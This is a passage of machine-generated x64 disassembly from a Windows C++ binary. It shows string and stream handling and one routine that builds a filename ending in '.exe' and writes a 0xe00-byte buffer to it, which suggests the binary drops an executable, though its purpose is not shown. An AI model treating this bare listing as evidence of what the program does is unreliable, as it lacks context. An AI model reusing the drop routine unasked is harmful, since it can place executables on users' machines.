   14000481b:	48 83 e8 08          	sub    $0x8,%rax
   14000481f:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004823:	76 16                	jbe    0x14000483b
   140004825:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   14000482a:	45 33 c9             	xor    %r9d,%r9d
   14000482d:	45 33 c0             	xor    %r8d,%r8d
   140004830:	33 d2                	xor    %edx,%edx
   140004832:	33 c9                	xor    %ecx,%ecx
   140004834:	ff 15 de 6a 00 00    	call   *0x6ade(%rip)        # 0x14000b318
   14000483a:	cc                   	int3
   14000483b:	e8 bc 3f 00 00       	call   0x1400087fc
   140004840:	90                   	nop
   140004841:	f6 c3 01             	test   $0x1,%bl
   140004844:	74 51                	je     0x140004897
   140004846:	83 e3 fe             	and    $0xfffffffe,%ebx
   140004849:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
   14000484d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004851:	76 44                	jbe    0x140004897
   140004853:	48 ff c2             	inc    %rdx
   140004856:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000485b:	48 8b c1             	mov    %rcx,%rax
   14000485e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004865:	72 2b                	jb     0x140004892
   140004867:	48 83 c2 27          	add    $0x27,%rdx
   14000486b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000486f:	48 2b c1             	sub    %rcx,%rax
   140004872:	48 83 e8 08          	sub    $0x8,%rax
   140004876:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000487a:	76 16                	jbe    0x140004892
   14000487c:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004881:	45 33 c9             	xor    %r9d,%r9d
   140004884:	45 33 c0             	xor    %r8d,%r8d
   140004887:	33 d2                	xor    %edx,%edx
   140004889:	33 c9                	xor    %ecx,%ecx
   14000488b:	ff 15 87 6a 00 00    	call   *0x6a87(%rip)        # 0x14000b318
   140004891:	cc                   	int3
   140004892:	e8 65 3f 00 00       	call   0x1400087fc
   140004897:	33 d2                	xor    %edx,%edx
   140004899:	41 b8 e8 00 00 00    	mov    $0xe8,%r8d
   14000489f:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   1400048a6:	e8 3a 4c 00 00       	call   0x1400094e5
   1400048ab:	48 8d 05 06 a2 00 00 	lea    0xa206(%rip),%rax        # 0x14000eab8
   1400048b2:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   1400048b9:	48 8d 8d 88 01 00 00 	lea    0x188(%rbp),%rcx
   1400048c0:	ff 15 0a 68 00 00    	call   *0x680a(%rip)        # 0x14000b0d0
   1400048c6:	90                   	nop
   1400048c7:	83 cb 04             	or     $0x4,%ebx
   1400048ca:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   1400048ce:	45 33 c9             	xor    %r9d,%r9d
   1400048d1:	45 33 c0             	xor    %r8d,%r8d
   1400048d4:	48 8d 95 08 01 00 00 	lea    0x108(%rbp),%rdx
   1400048db:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   1400048e2:	ff 15 00 68 00 00    	call   *0x6800(%rip)        # 0x14000b0e8
   1400048e8:	90                   	nop
   1400048e9:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   1400048f0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400048f4:	48 8d 05 85 a0 00 00 	lea    0xa085(%rip),%rax        # 0x14000e980
   1400048fb:	48 89 84 0d 00 01 00 	mov    %rax,0x100(%rbp,%rcx,1)
   140004902:	00 
   140004903:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   14000490a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000490e:	8d 91 78 ff ff ff    	lea    -0x88(%rcx),%edx
   140004914:	89 94 0d fc 00 00 00 	mov    %edx,0xfc(%rbp,%rcx,1)
   14000491b:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   140004922:	ff 15 c0 68 00 00    	call   *0x68c0(%rip)        # 0x14000b1e8
   140004928:	48 8d 05 11 a1 00 00 	lea    0xa111(%rip),%rax        # 0x14000ea40
   14000492f:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   140004936:	4c 89 ad 70 01 00 00 	mov    %r13,0x170(%rbp)
   14000493d:	c7 85 78 01 00 00 04 	movl   $0x4,0x178(%rbp)
   140004944:	00 00 00 
   140004947:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   14000494e:	e8 6d 17 00 00       	call   0x1400060c0
   140004953:	48 8b c8             	mov    %rax,%rcx
   140004956:	48 8d 15 53 cc ff ff 	lea    -0x33ad(%rip),%rdx        # 0x1400015b0
   14000495d:	ff 15 fd 67 00 00    	call   *0x67fd(%rip)        # 0x14000b160
   140004963:	48 8b c8             	mov    %rax,%rcx
   140004966:	48 8d 15 63 cc ff ff 	lea    -0x339d(%rip),%rdx        # 0x1400015d0
   14000496d:	ff 15 ed 67 00 00    	call   *0x67ed(%rip)        # 0x14000b160
   140004973:	48 8b c8             	mov    %rax,%rcx
   140004976:	41 8b d7             	mov    %r15d,%edx
   140004979:	ff 15 e9 67 00 00    	call   *0x67e9(%rip)        # 0x14000b168
   14000497f:	90                   	nop
   140004980:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004983:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140004988:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
   14000498d:	ba 0f 00 00 00       	mov    $0xf,%edx
   140004992:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   140004997:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   14000499c:	83 cb 10             	or     $0x10,%ebx
   14000499f:	89 5c 24 50          	mov    %ebx,0x50(%rsp)
   1400049a3:	8b 8d 78 01 00 00    	mov    0x178(%rbp),%ecx
   1400049a9:	f6 c1 02             	test   $0x2,%cl
   1400049ac:	74 05                	je     0x1400049b3
   1400049ae:	f6 c1 20             	test   $0x20,%cl
   1400049b1:	74 2d                	je     0x1400049e0
   1400049b3:	48 8b 85 48 01 00 00 	mov    0x148(%rbp),%rax
   1400049ba:	48 8b 18             	mov    (%rax),%rbx
   1400049bd:	48 85 db             	test   %rbx,%rbx
   1400049c0:	74 1e                	je     0x1400049e0
   1400049c2:	48 8b 85 28 01 00 00 	mov    0x128(%rbp),%rax
   1400049c9:	4c 8b 08             	mov    (%rax),%r9
   1400049cc:	48 3b 9d 70 01 00 00 	cmp    0x170(%rbp),%rbx
   1400049d3:	48 0f 42 9d 70 01 00 	cmovb  0x170(%rbp),%rbx
   1400049da:	00 
   1400049db:	49 2b d9             	sub    %r9,%rbx
   1400049de:	eb 2e                	jmp    0x140004a0e
   1400049e0:	f6 c1 04             	test   $0x4,%cl
   1400049e3:	75 5c                	jne    0x140004a41
   1400049e5:	48 8b 85 40 01 00 00 	mov    0x140(%rbp),%rax
   1400049ec:	48 8b 08             	mov    (%rax),%rcx
   1400049ef:	48 85 c9             	test   %rcx,%rcx
   1400049f2:	74 4d                	je     0x140004a41
   1400049f4:	48 8b 85 20 01 00 00 	mov    0x120(%rbp),%rax
   1400049fb:	4c 8b 08             	mov    (%rax),%r9
   1400049fe:	48 8b 85 58 01 00 00 	mov    0x158(%rbp),%rax
   140004a05:	48 63 18             	movslq (%rax),%rbx
   140004a08:	49 2b d9             	sub    %r9,%rbx
   140004a0b:	48 03 d9             	add    %rcx,%rbx
   140004a0e:	4d 85 c9             	test   %r9,%r9
   140004a11:	74 2e                	je     0x140004a41
   140004a13:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004a18:	48 3b da             	cmp    %rdx,%rbx
   140004a1b:	77 17                	ja     0x140004a34
   140004a1d:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   140004a22:	4c 8b c3             	mov    %rbx,%r8
   140004a25:	49 8b d1             	mov    %r9,%rdx
   140004a28:	e8 62 4c 00 00       	call   0x14000968f
   140004a2d:	c6 44 1c 58 00       	movb   $0x0,0x58(%rsp,%rbx,1)
   140004a32:	eb 08                	jmp    0x140004a3c
   140004a34:	48 8b d3             	mov    %rbx,%rdx
   140004a37:	e8 b4 39 00 00       	call   0x1400083f0
   140004a3c:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004a41:	48 8d b5 e0 00 00 00 	lea    0xe0(%rbp),%rsi
   140004a48:	66 48 0f 7e f9       	movq   %xmm7,%rcx
   140004a4d:	66 0f 6f c6          	movdqa %xmm6,%xmm0
   140004a51:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004a56:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140004a5b:	48 83 f8 0f          	cmp    $0xf,%rax
   140004a5f:	48 0f 47 f1          	cmova  %rcx,%rsi
   140004a63:	66 49 0f 7e f6       	movq   %xmm6,%r14
   140004a68:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140004a6d:	48 8b c2             	mov    %rdx,%rax
   140004a70:	49 2b c0             	sub    %r8,%rax
   140004a73:	4c 3b f0             	cmp    %rax,%r14
   140004a76:	77 79                	ja     0x140004af1
   140004a78:	4b 8d 04 06          	lea    (%r14,%r8,1),%rax
   140004a7c:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140004a81:	48 8d 5c 24 58       	lea    0x58(%rsp),%rbx
   140004a86:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004a8a:	48 0f 47 5c 24 58    	cmova  0x58(%rsp),%rbx
   140004a90:	49 8d 04 36          	lea    (%r14,%rsi,1),%rax
   140004a94:	48 3b c3             	cmp    %rbx,%rax
   140004a97:	76 1b                	jbe    0x140004ab4
   140004a99:	49 8d 04 18          	lea    (%r8,%rbx,1),%rax
   140004a9d:	48 3b f0             	cmp    %rax,%rsi
   140004aa0:	77 12                	ja     0x140004ab4
   140004aa2:	48 3b de             	cmp    %rsi,%rbx
   140004aa5:	77 05                	ja     0x140004aac
   140004aa7:	4d 8b fd             	mov    %r13,%r15
   140004aaa:	eb 0b                	jmp    0x140004ab7
   140004aac:	4c 8b fb             	mov    %rbx,%r15
   140004aaf:	4c 2b fe             	sub    %rsi,%r15
   140004ab2:	eb 03                	jmp    0x140004ab7
   140004ab4:	4d 8b fe             	mov    %r14,%r15
   140004ab7:	49 ff c0             	inc    %r8
   140004aba:	49 8d 0c 1e          	lea    (%r14,%rbx,1),%rcx
   140004abe:	48 8b d3             	mov    %rbx,%rdx
   140004ac1:	e8 c9 4b 00 00       	call   0x14000968f
   140004ac6:	4d 8b c7             	mov    %r15,%r8
   140004ac9:	48 8b d6             	mov    %rsi,%rdx
   140004acc:	48 8b cb             	mov    %rbx,%rcx
   140004acf:	e8 17 4a 00 00       	call   0x1400094eb
   140004ad4:	4d 8b c6             	mov    %r14,%r8
   140004ad7:	4d 2b c7             	sub    %r15,%r8
   140004ada:	4b 8d 14 3e          	lea    (%r14,%r15,1),%rdx
   140004ade:	48 03 d6             	add    %rsi,%rdx
   140004ae1:	4a 8d 0c 3b          	lea    (%rbx,%r15,1),%rcx
   140004ae5:	e8 01 4a 00 00       	call   0x1400094eb
   140004aea:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140004aef:	eb 17                	jmp    0x140004b08
   140004af1:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140004af6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004afb:	49 8b d6             	mov    %r14,%rdx
   140004afe:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004b03:	e8 58 37 00 00       	call   0x140008260
   140004b08:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004b0b:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004b10:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004b13:	f3 0f 7f 4c 24 40    	movdqu %xmm1,0x40(%rsp)
   140004b19:	0f 10 00             	movups (%rax),%xmm0
   140004b1c:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004b21:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004b25:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140004b2a:	4c 89 68 10          	mov    %r13,0x10(%rax)
   140004b2e:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140004b35:	00 
   140004b36:	c6 00 00             	movb   $0x0,(%rax)
   140004b39:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140004b3e:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004b43:	48 8b c2             	mov    %rdx,%rax
   140004b46:	48 2b c1             	sub    %rcx,%rax
   140004b49:	48 83 f8 04          	cmp    $0x4,%rax
   140004b4d:	72 2b                	jb     0x140004b7a
   140004b4f:	48 8d 41 04          	lea    0x4(%rcx),%rax
   140004b53:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004b58:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004b5d:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004b61:	48 0f 47 44 24 30    	cmova  0x30(%rsp),%rax
   140004b67:	c7 04 01 2e 65 78 65 	movl   $0x6578652e,(%rcx,%rax,1)
   140004b6e:	c6 44 01 04 00       	movb   $0x0,0x4(%rcx,%rax,1)
   140004b73:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004b78:	eb 18                	jmp    0x140004b92
   140004b7a:	48 c7 44 24 20 04 00 	movq   $0x4,0x20(%rsp)
   140004b81:	00 00 
   140004b83:	ba 04 00 00 00       	mov    $0x4,%edx
   140004b88:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b8d:	e8 ee 34 00 00       	call   0x140008080
   140004b92:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004b95:	0f 11 85 c0 00 00 00 	movups %xmm0,0xc0(%rbp)
   140004b9c:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004b9f:	f3 0f 7f 8d d0 00 00 	movdqu %xmm1,0xd0(%rbp)
   140004ba6:	00 
   140004ba7:	0f 10 00             	movups (%rax),%xmm0
   140004baa:	0f 11 85 c0 00 00 00 	movups %xmm0,0xc0(%rbp)
   140004bb1:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004bb5:	0f 11 8d d0 00 00 00 	movups %xmm1,0xd0(%rbp)
   140004bbc:	4c 89 68 10          	mov    %r13,0x10(%rax)
   140004bc0:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   140004bc7:	00 
   140004bc8:	c6 00 00             	movb   $0x0,(%rax)
   140004bcb:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004bd0:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004bd4:	76 44                	jbe    0x140004c1a
   140004bd6:	48 ff c2             	inc    %rdx
   140004bd9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140004bde:	48 8b c1             	mov    %rcx,%rax
   140004be1:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004be8:	72 2b                	jb     0x140004c15
   140004bea:	48 83 c2 27          	add    $0x27,%rdx
   140004bee:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004bf2:	48 2b c1             	sub    %rcx,%rax
   140004bf5:	48 83 e8 08          	sub    $0x8,%rax
   140004bf9:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004bfd:	76 16                	jbe    0x140004c15
   140004bff:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004c04:	45 33 c9             	xor    %r9d,%r9d
   140004c07:	45 33 c0             	xor    %r8d,%r8d
   140004c0a:	33 d2                	xor    %edx,%edx
   140004c0c:	33 c9                	xor    %ecx,%ecx
   140004c0e:	ff 15 04 67 00 00    	call   *0x6704(%rip)        # 0x14000b318
   140004c14:	cc                   	int3
   140004c15:	e8 e2 3b 00 00       	call   0x1400087fc
   140004c1a:	66 0f 6f 05 9e 9e 00 	movdqa 0x9e9e(%rip),%xmm0        # 0x14000eac0
   140004c21:	00 
   140004c22:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   140004c28:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   140004c2d:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004c32:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004c36:	76 44                	jbe    0x140004c7c
   140004c38:	48 ff c2             	inc    %rdx
   140004c3b:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140004c40:	48 8b c1             	mov    %rcx,%rax
   140004c43:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004c4a:	72 2b                	jb     0x140004c77
   140004c4c:	48 83 c2 27          	add    $0x27,%rdx
   140004c50:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004c54:	48 2b c1             	sub    %rcx,%rax
   140004c57:	48 83 e8 08          	sub    $0x8,%rax
   140004c5b:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004c5f:	76 16                	jbe    0x140004c77
   140004c61:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004c66:	45 33 c9             	xor    %r9d,%r9d
   140004c69:	45 33 c0             	xor    %r8d,%r8d
   140004c6c:	33 d2                	xor    %edx,%edx
   140004c6e:	33 c9                	xor    %ecx,%ecx
   140004c70:	ff 15 a2 66 00 00    	call   *0x66a2(%rip)        # 0x14000b318
   140004c76:	cc                   	int3
   140004c77:	e8 80 3b 00 00       	call   0x1400087fc
   140004c7c:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
   140004c81:	48 c7 44 24 70 0f 00 	movq   $0xf,0x70(%rsp)
   140004c88:	00 00 
   140004c8a:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   140004c8f:	33 d2                	xor    %edx,%edx
   140004c91:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140004c97:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004c9b:	e8 45 48 00 00       	call   0x1400094e5
   140004ca0:	48 8d 95 c0 00 00 00 	lea    0xc0(%rbp),%rdx
   140004ca7:	48 83 bd d8 00 00 00 	cmpq   $0xf,0xd8(%rbp)
   140004cae:	0f 
   140004caf:	48 0f 47 95 c0 00 00 	cmova  0xc0(%rbp),%rdx
   140004cb6:	00 
   140004cb7:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004cbb:	e8 80 2e 00 00       	call   0x140007b40
   140004cc0:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004cc4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cc8:	48 8d 05 41 9d 00 00 	lea    0x9d41(%rip),%rax        # 0x14000ea10
   140004ccf:	48 89 44 0d b0       	mov    %rax,-0x50(%rbp,%rcx,1)
   140004cd4:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004cd8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cdc:	44 8d 81 58 ff ff ff 	lea    -0xa8(%rcx),%r8d
   140004ce3:	44 89 44 0d ac       	mov    %r8d,-0x54(%rbp,%rcx,1)
   140004ce8:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004cec:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004cf0:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   140004cf4:	48 03 c8             	add    %rax,%rcx
   140004cf7:	ff 15 83 64 00 00    	call   *0x6483(%rip)        # 0x14000b180
   140004cfd:	84 c0                	test   %al,%al
   140004cff:	74 3f                	je     0x140004d40
   140004d01:	41 b8 00 0e 00 00    	mov    $0xe00,%r8d
   140004d07:	49 8b d4             	mov    %r12,%rdx
   140004d0a:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004d0e:	ff 15 5c 64 00 00    	call   *0x645c(%rip)        # 0x14000b170
   140004d14:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140004d18:	e8 23 31 00 00       	call   0x140007e40
   140004d1d:	48 85 c0             	test   %rax,%rax
   140004d20:	75 1e                	jne    0x140004d40
   140004d22:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140004d26:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004d2a:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   140004d2e:	48 03 c8             	add    %rax,%rcx
   140004d31:	45 33 c0             	xor    %r8d,%r8d
   140004d34:	ba 02 00 00 00       	mov    $0x2,%edx
   140004d39:	ff 15 89 63 00 00    	call   *0x6389(%rip)        # 0x14000b0c8
   140004d3f:	90                   	nop
   140004d40:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140004d44:	e8 17 02 00 00       	call   0x140004f60
   140004d49:	90                   	nop
   140004d4a:	48 8b 95 d8 00 00 00 	mov    0xd8(%rbp),%rdx
   140004d51:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004d55:	76 46                	jbe    0x140004d9d
   140004d57:	48 ff c2             	inc    %rdx
   140004d5a:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   140004d61:	48 8b c1             	mov    %rcx,%rax
   140004d64:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004d6b:	72 2b                	jb     0x140004d98
   140004d6d:	48 83 c2 27          	add    $0x27,%rdx
   140004d71:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004d75:	48 2b c1             	sub    %rcx,%rax
   140004d78:	48 83 e8 08          	sub    $0x8,%rax
   140004d7c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004d80:	76 16                	jbe    0x140004d98
   140004d82:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004d87:	45 33 c9             	xor    %r9d,%r9d
   140004d8a:	45 33 c0             	xor    %r8d,%r8d
   140004d8d:	33 d2                	xor    %edx,%edx
   140004d8f:	33 c9                	xor    %ecx,%ecx
   140004d91:	ff 15 81 65 00 00    	call   *0x6581(%rip)        # 0x14000b318
   140004d97:	cc                   	int3
   140004d98:	e8 5f 3a 00 00       	call   0x1400087fc
   140004d9d:	66 0f 6f 05 1b 9d 00 	movdqa 0x9d1b(%rip),%xmm0        # 0x14000eac0
   140004da4:	00 
   140004da5:	f3 0f 7f 85 d0 00 00 	movdqu %xmm0,0xd0(%rbp)
   140004dac:	00 
   140004dad:	c6 85 c0 00 00 00 00 	movb   $0x0,0xc0(%rbp)
   140004db4:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   140004dbb:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004dbf:	48 8d 05 ba 9b 00 00 	lea    0x9bba(%rip),%rax        # 0x14000e980
   140004dc6:	48 89 84 0d 00 01 00 	mov    %rax,0x100(%rbp,%rcx,1)
   140004dcd:	00 
   140004dce:	48 8b 85 00 01 00 00 	mov    0x100(%rbp),%rax
   140004dd5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004dd9:	8d 91 78 ff ff ff    	lea    -0x88(%rcx),%edx
   140004ddf:	89 94 0d fc 00 00 00 	mov    %edx,0xfc(%rbp,%rcx,1)
   140004de6:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   140004ded:	e8 2e 28 00 00       	call   0x140007620
   140004df2:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140004df9:	ff 15 59 63 00 00    	call   *0x6359(%rip)        # 0x14000b158
   140004dff:	48 8d 8d 88 01 00 00 	lea    0x188(%rbp),%rcx
   140004e06:	ff 15 f4 62 00 00    	call   *0x62f4(%rip)        # 0x14000b100
   140004e0c:	90                   	nop
   140004e0d:	48 8b 95 f8 00 00 00 	mov    0xf8(%rbp),%rdx
   140004e14:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004e18:	76 47                	jbe    0x140004e61
   140004e1a:	48 ff c2             	inc    %rdx
   140004e1d:	48 8b 8d e0 00 00 00 	mov    0xe0(%rbp),%rcx
   140004e24:	48 8b c1             	mov    %rcx,%rax
   140004e27:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004e2e:	72 2b                	jb     0x140004e5b
   140004e30:	48 83 c2 27          	add    $0x27,%rdx
   140004e34:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004e38:	48 2b c1             	sub    %rcx,%rax
   140004e3b:	48 83 e8 08          	sub    $0x8,%rax
   140004e3f:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004e43:	76 16                	jbe    0x140004e5b
   140004e45:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004e4a:	45 33 c9             	xor    %r9d,%r9d
   140004e4d:	45 33 c0             	xor    %r8d,%r8d
   140004e50:	33 d2                	xor    %edx,%edx
   140004e52:	33 c9                	xor    %ecx,%ecx
   140004e54:	ff 15 be 64 00 00    	call   *0x64be(%rip)        # 0x14000b318
   140004e5a:	cc                   	int3
   140004e5b:	e8 9c 39 00 00       	call   0x1400087fc
   140004e60:	90                   	nop
   140004e61:	48 8b 57 18          	mov    0x18(%rdi),%rdx
   140004e65:	48 83 fa 0f          	cmp    $0xf,%rdx
   140004e69:	76 2c                	jbe    0x140004e97
   140004e6b:	48 ff c2             	inc    %rdx
   140004e6e:	48 8b 0f             	mov    (%rdi),%rcx
   140004e71:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004e78:	72 18                	jb     0x140004e92
   140004e7a:	48 83 c2 27          	add    $0x27,%rdx
   140004e7e:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140004e82:	48 2b c8             	sub    %rax,%rcx
   140004e85:	48 83 e9 08          	sub    $0x8,%rcx
   140004e89:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140004e8d:	77 4b                	ja     0x140004eda
   140004e8f:	48 8b c8             	mov    %rax,%rcx
   140004e92:	e8 65 39 00 00       	call   0x1400087fc
   140004e97:	4c 89 6f 10          	mov    %r13,0x10(%rdi)
   140004e9b:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   140004ea2:	00 
   140004ea3:	c6 07 00             	movb   $0x0,(%rdi)
   140004ea6:	48 8b 8d f0 01 00 00 	mov    0x1f0(%rbp),%rcx
   140004ead:	48 33 cc             	xor    %rsp,%rcx
   140004eb0:	e8 ab 36 00 00       	call   0x140008560
   140004eb5:	4c 8d 9c 24 20 03 00 	lea    0x320(%rsp),%r11
   140004ebc:	00 
   140004ebd:	49 8b 5b 50          	mov    0x50(%r11),%rbx
   140004ec1:	41 0f 28 73 f0       	movaps -0x10(%r11),%xmm6
   140004ec6:	41 0f 28 7b e0       	movaps -0x20(%r11),%xmm7
   140004ecb:	49 8b e3             	mov    %r11,%rsp
   140004ece:	41 5f                	pop    %r15
   140004ed0:	41 5e                	pop    %r14
   140004ed2:	41 5d                	pop    %r13
   140004ed4:	41 5c                	pop    %r12
   140004ed6:	5f                   	pop    %rdi
   140004ed7:	5e                   	pop    %rsi
   140004ed8:	5d                   	pop    %rbp
   140004ed9:	c3                   	ret
   140004eda:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004edf:	45 33 c9             	xor    %r9d,%r9d
   140004ee2:	45 33 c0             	xor    %r8d,%r8d
   140004ee5:	33 d2                	xor    %edx,%edx
   140004ee7:	33 c9                	xor    %ecx,%ecx
   140004ee9:	ff 15 29 64 00 00    	call   *0x6429(%rip)        # 0x14000b318
   140004eef:	90                   	nop
   140004ef0:	e8 cb c5 ff ff       	call   0x1400014c0
   140004ef5:	90                   	nop
   140004ef6:	e8 25 c5 ff ff       	call   0x140001420
   140004efb:	cc                   	int3
   140004efc:	cc                   	int3
   140004efd:	cc                   	int3
   140004efe:	cc                   	int3
   140004eff:	cc                   	int3
   140004f00:	40 53                	rex push %rbx
   140004f02:	48 83 ec 20          	sub    $0x20,%rsp
   140004f06:	48 8b 01             	mov    (%rcx),%rax
   140004f09:	48 8d 99 88 00 00 00 	lea    0x88(%rcx),%rbx
   140004f10:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004f14:	48 8d 05 65 9a 00 00 	lea    0x9a65(%rip),%rax        # 0x14000e980
   140004f1b:	48 89 84 1a 78 ff ff 	mov    %rax,-0x88(%rdx,%rbx,1)
   140004f22:	ff 
   140004f23:	48 8b 01             	mov    (%rcx),%rax
   140004f26:	48 83 c1 08          	add    $0x8,%rcx
   140004f2a:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004f2e:	44 8d 82 78 ff ff ff 	lea    -0x88(%rdx),%r8d
   140004f35:	44 89 84 1a 74 ff ff 	mov    %r8d,-0x8c(%rdx,%rbx,1)
   140004f3c:	ff 
   140004f3d:	e8 de 26 00 00       	call   0x140007620
   140004f42:	48 8d 4b 88          	lea    -0x78(%rbx),%rcx
   140004f46:	ff 15 0c 62 00 00    	call   *0x620c(%rip)        # 0x14000b158
   140004f4c:	48 8b cb             	mov    %rbx,%rcx
   140004f4f:	48 83 c4 20          	add    $0x20,%rsp
   140004f53:	5b                   	pop    %rbx
   140004f54:	48 ff 25 a5 61 00 00 	rex.W jmp *0x61a5(%rip)        # 0x14000b100
   140004f5b:	cc                   	int3
   140004f5c:	cc                   	int3
   140004f5d:	cc                   	int3
   140004f5e:	cc                   	int3
   140004f5f:	cc                   	int3
   140004f60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f65:	57                   	push   %rdi
   140004f66:	48 83 ec 20          	sub    $0x20,%rsp
   140004f6a:	48 8d b9 a8 00 00 00 	lea    0xa8(%rcx),%rdi
   140004f71:	48 8b 01             	mov    (%rcx),%rax
   140004f74:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140004f78:	48 8d 05 91 9a 00 00 	lea    0x9a91(%rip),%rax        # 0x14000ea10
   140004f7f:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   140004f86:	ff 
